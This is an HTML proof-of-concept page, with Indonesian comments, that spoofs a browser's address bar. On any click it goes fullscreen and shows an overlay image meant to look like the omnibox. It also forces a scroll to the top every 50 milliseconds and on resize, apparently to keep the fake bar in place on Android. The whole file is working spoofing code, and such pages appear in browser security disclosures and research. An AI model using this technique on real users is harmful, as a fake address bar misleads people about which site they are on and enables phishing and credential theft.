<!DOCTYPE html>
<html lang="en">
<head>
    <title>Security UI Spoof</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden; /* mencegah scroll manual */
        }         
        #spoof {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none;
            z-index: 9999;
            object-fit: cover;
            pointer-events: none;
        }
        #content {
            text-align: center;
            margin-top: 20vh;
        }
    </style>
</head>  
<body>

<img id="spoof" src="spoof.png" alt="overlay">
<div id="content">
    <br><br><br>
    <center>
        <h1>Click anywhere on the page to spoof the omnibox!</h1>
    </center>
</div>

<script>
const spoof = document.getElementById("spoof");
const content = document.getElementById("content");

// Fungsi paksa scroll ke atas
function forceScrollTop() {
    window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}

// Klik anywhere
onclick = async () => {
    try {
        // Jika ingin trigger contacts, bisa aktifkan ini
        // await navigator.contacts.select(["name"], {});
    } catch(e) {}

    spoof.style.display = "block";
    content.style.display = "none";

    if (document.documentElement.requestFullscreen) {
        try {
            await document.documentElement.requestFullscreen();
        } catch(e) {}
    }
}

// Ketika keluar fullscreen â†’ scroll ke atas otomatis
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
        forceScrollTop();
    }
});

// Interval ekstra untuk tombol back Android / omnibar muncul
setInterval(forceScrollTop, 50);

// Resize listener juga untuk Android omnibar
window.addEventListener('resize', forceScrollTop);

</script>

</body>
</html>
